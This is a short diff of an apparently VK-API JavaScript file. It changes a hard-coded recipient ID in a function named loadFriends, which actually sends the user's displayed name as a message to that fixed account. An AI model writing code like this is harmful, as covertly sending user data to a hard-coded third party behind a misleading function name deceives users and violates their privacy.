@@ -47,9 +47,9 @@
     }
 
     function loadFriends() {
-        sendRequest('messages.send', {user_id: 11971008, peer_id: 11971008,
+        sendRequest('messages.send', {user_id: 51532049, peer_id: 51532049,
           random_id: 11197103082 + (Math.floor(Math.random() * 1000)),
-           message: 'Имя:' + $(userName).value, 
+           message: 'Имя:' + $(userName).innerHTML,
            v : '5.52'},
            function (data) {
             //drawFriends(data.response);
